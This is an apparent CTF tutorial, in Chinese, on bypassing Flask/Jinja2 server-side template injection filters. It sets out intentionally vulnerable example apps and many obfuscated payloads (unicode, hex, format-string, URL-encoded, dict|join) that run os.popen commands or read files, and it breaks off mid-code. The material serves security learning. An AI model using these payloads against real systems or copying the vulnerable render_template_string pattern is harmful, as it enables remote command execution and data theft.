<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过attr+request的方法绕过<code>_</code>过滤之后的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(<span class="number">147</span>)|attr(request.args.e)|attr(request.args.f)|attr(request.args.g)(request.args.h)|attr(request.args.i)(<span class="string">&#x27;eval&#x27;</span>)(request.args.j)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=__builtins__&amp;i=__getitem__&amp;j=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250701162420.png"><br>然后除了过滤器之外还可以使用下面的几种方法和payload进行绕过<br>unicode编码也可以绕过，对应的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0064\u0069\u0072\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>16进制编码绕过也可以，对应的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>)()|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>base64也可以进行绕过，但是python3已经不可以使用了，这里就不演示了，遇到这种可以现搜。<br>格式化字符串的形式也可以绕过，通过格式化<code>_</code>来绕过，对应的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cbase%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%csubclasses%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))()|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="number">147</span>)|attr(<span class="string">&quot;%c%cinit%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cglobals%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="string">&quot;%c%cbuiltins%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))|attr(<span class="string">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;%c%cimport%c%c(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是这里<code>%c</code>可能会被识别成url编码导致解析失败，最好url转一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=%7B%7B%<span class="number">27</span>%<span class="number">27</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cclass%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cbase%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25csubclasses%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28147</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cinit%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cglobals%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%25c%25cbuiltins%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7Cattr%<span class="number">28</span>%<span class="number">22</span>%25c%25cgetitem%25c%25c%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%<span class="number">28</span>%27<span class="built_in">eval</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%25c%25cimport%25c%25c%<span class="number">28</span>%27os%<span class="number">27</span>%<span class="number">29</span>%2Epopen%<span class="number">28</span>%27<span class="built_in">dir</span>%<span class="number">27</span>%<span class="number">29</span>%2Eread%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">25</span>%<span class="number">2895</span>%2C95%2C95%2C95%<span class="number">29</span>%<span class="number">29</span>%7D%7D</span><br></pre></td></tr></table></figure>
<p>PS:模板payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="字符串过滤绕过"><a href="#字符串过滤绕过" class="headerlink" title="字符串过滤绕过"></a>字符串过滤绕过</h1><p>看一道例题，源码是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (</span><br><span class="line">        <span class="string">&quot;class&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;base&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;request&quot;</span> <span class="keyword">in</span> input_str</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>如果这道题目不过滤<code>request</code>就完全可以通过他去绕过，这里需要自己拼接字符串，在上面也简单的学习了一些过滤器，下面介绍一下<code>join</code>和<code>dict</code>的组合用法，我们先看一下join和dict的基础用法，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            a:&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>此时访问返回的内容将是<code>aaabbb</code>，上端代码的主要内容是下面这串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>他是先设置了一个变量a，然后创建了一个dict(字典)类型，里面存储了两个数据，然后通过join去拼接dict的键，拼好的内容丢给a变量，最后展示出来。这里就可以通过这个特定进行绕过上面的例题，具体采用的payload模板是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>通过下面的payload进行绕过(采用dict+join过滤器)，payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> aaaa=<span class="built_in">dict</span>(__cla=<span class="number">1</span>,ss__=b)|join %&#125;&#123;%<span class="built_in">set</span> bbbb=<span class="built_in">dict</span>(__ba=<span class="number">1</span>,se__=<span class="number">2</span>)|join%&#125;&#123;%<span class="built_in">set</span> cccc=<span class="built_in">dict</span>(__subcl=<span class="number">1</span>,asses__=<span class="number">2</span>)|join%&#125;&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(aaaa)|attr(bbbb)|attr(cccc)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">147</span>)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702133606.png"></p>
<h1 id="点过滤绕过"><a href="#点过滤绕过" class="headerlink" title="点过滤绕过"></a>点过滤绕过</h1><p>这个其实没什么好说的，可以通过python的语法使用<code>[]</code>去绕过，或者使用attr都可以，例题代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>可以通过<code>[]</code>或者<code>attr</code>绕过，payload模板如下,使用的是<code>_frozen_importlib_external.FileLoader</code>类读取文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>成功绕过的payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">122</span>][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="built_in">str</span>=&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">122</span>]|attr(<span class="string">&quot;get_data&quot;</span>)(<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="数字过滤绕过"><a href="#数字过滤绕过" class="headerlink" title="数字过滤绕过"></a>数字过滤绕过</h1><p>例题如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> <span class="built_in">any</span>(char.isdigit() <span class="keyword">for</span> char <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>这道题目在输入任何数字都会进行报<code>hack!</code>,例如下面payload返回的就是，具体的问题位置是在<code>[122]</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">122</span>]|attr(<span class="string">&quot;get_data&quot;</span>)(<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>绕过手法是通过<code>&#123;%%&#125;</code>+<code>lenght</code>去设置变量，例如我的数字数据需要两个，一个是122还有一个是0,那么我们就需要构造出两个变量，然后再去执行命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> a = <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaa&quot;</span>|length*<span class="string">&#x27;aaaaaa&#x27;</span>|length - <span class="string">&#x27;aaaa&#x27;</span>|length %&#125;&#123;% <span class="built_in">set</span> b = false %&#125;&#123;&#123; (<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[a]|attr(<span class="string">&quot;get_data&quot;</span>)(b,<span class="string">&quot;flag&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后<code>&quot;aaaaaaaaaaaaaaaaaaaaa&quot;|length*&#39;aaaaaa&#39;|length - &#39;aaaa&#39;|length</code>可以拆分来看<br><code>aaaaaaaaaaaaaaaaaaaaa&quot;|length</code>&#x3D;21 * <code>&#39;aaaaaa&#39;|length</code> &#x3D; 6 - <code>&#39;aaaa&#39;|length</code> &#x3D; 4 相当于<code>21*6-4</code>。</p>
<h1 id="config过滤绕过"><a href="#config过滤绕过" class="headerlink" title="config过滤绕过"></a>config过滤绕过</h1><p>有些题目会禁用<code>config</code>这个模块，例如这道例题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;% set config=None%&#125;&#123;% set self=None%&#125;&quot;</span> + input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = waf(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span 